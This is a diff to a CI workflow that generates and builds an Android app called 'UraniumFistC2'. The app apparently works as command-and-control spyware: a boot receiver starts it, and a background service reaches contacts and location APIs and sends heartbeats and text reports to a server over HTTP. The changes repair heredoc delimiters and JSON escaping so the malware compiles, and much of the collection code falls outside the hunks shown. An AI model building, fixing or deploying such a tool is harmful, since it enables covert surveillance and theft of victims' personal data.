@@ -27,7 +27,7 @@ jobs:
         run: |
           mkdir -p app/src/main/java/com/uranium/fist app/src/main/res/values app/src/main/assets
           
-          cat << 'EOF' > app/src/main/AndroidManifest.xml
+          cat << 'MANIFESTEOF' > app/src/main/AndroidManifest.xml
           <manifest xmlns:android="http://schemas.android.com/apk/res/android"
               xmlns:tools="http://schemas.android.com/tools">
 
@@ -86,9 +86,9 @@ jobs:
 
               </application>
           </manifest>
-          EOF
+          MANIFESTEOF
 
-          cat << 'EOF' > app/src/main/java/com/uranium/fist/MainActivity.kt
+          cat << 'MAINEOF' > app/src/main/java/com/uranium/fist/MainActivity.kt
           package com.uranium.fist
 
           import android.Manifest
@@ -144,9 +144,9 @@ jobs:
                   finish()
               }
           }
-          EOF
+          MAINEOF
 
-          cat << 'EOF' > app/src/main/java/com/uranium/fist/BootReceiver.kt
+          cat << 'BOOTEOF' > app/src/main/java/com/uranium/fist/BootReceiver.kt
           package com.uranium.fist
 
           import android.content.BroadcastReceiver
@@ -164,9 +164,9 @@ jobs:
                   }
               }
           }
-          EOF
+          BOOTEOF
 
-          cat << 'EOF' > app/src/main/java/com/uranium/fist/SyncService.kt
+          cat << 'SERVICEOF' > app/src/main/java/com/uranium/fist/SyncService.kt
           package com.uranium.fist
 
           import android.app.Notification
@@ -180,7 +180,6 @@ jobs:
           import android.location.LocationManager
           import android.net.Uri
           import android.os.Build
-          import android.os.Environment
           import android.os.IBinder
           import android.os.PowerManager
           import android.provider.ContactsContract
@@ -246,7 +245,7 @@ jobs:
                               conn.connectTimeout = 10000
                               conn.readTimeout = 10000
 
-                              val reportJson = "{"type":"TEXT_REPORT","data":"[Heartbeat] Uranium Node active from $nodeModel"}"
+                              val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"[Heartbeat] Uranium Node active from $nodeModel\"}"
 
                               OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
                                   os.write(reportJson)
@@ -619,7 +618,7 @@ jobs:
                       conn.setRequestProperty("Content-Type", "application/json; charset=utf-8")
                       conn.doOutput = true
                       
-                      val safeText = reportText.replace(""", "'").replace("\n", "\\n")
+                      val safeText = reportText.replace("\"", "'").replace("\n", "\\n")
                       val reportJson = "{\"type\":\"TEXT_REPORT\",\"data\":\"$safeText\"}"
 
                       OutputStreamWriter(conn.outputStream, "UTF-8").use { os ->
@@ -641,9 +640,9 @@ jobs:
 
               override fun onBind(intent: Intent?): IBinder? = null
           }
-          EOF
+          SERVICEOF
 
-          cat << 'EOF' > app/build.gradle
+          cat << 'BUILDEOF' > app/build.gradle
           plugins {
               id 'com.android.application'
               id 'org.jetbrains.kotlin.android'
@@ -677,16 +676,16 @@ jobs:
               implementation 'androidx.work:work-runtime-ktx:2.9.0'
               implementation 'org.jetbrains.kotlinx:kotlinx-coroutines-android:1.7.3'
           }
-          EOF
+          BUILDEOF
 
-          cat << 'GradleEOF' > build.gradle
+          cat << 'GRAPDLEEOF' > build.gradle
           plugins {
               id 'com.android.application' version '8.1.1' apply false
               id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
           }
-          GradleEOF
+          GRAPDLEEOF
 
-          cat << 'SettingsEOF' > settings.gradle
+          cat << 'SETEOF' > settings.gradle
           pluginManagement {
               repositories {
                   google()
@@ -703,14 +702,14 @@ jobs:
           }
           rootProject.name = "UraniumFistC2"
           include ':app'
-          SettingsEOF
+          SETEOF
 
-          cat << 'PropsEOF' > gradle.properties
+          cat << 'PROPSEOF' > gradle.properties
           android.system.LowMemory=true
           android.useAndroidX=true
           android.enableJetifier=true
           org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
-          PropsEOF
+          PROPSEOF
 
       - name: Build APK Debug
         run: gradle app:assembleDebug
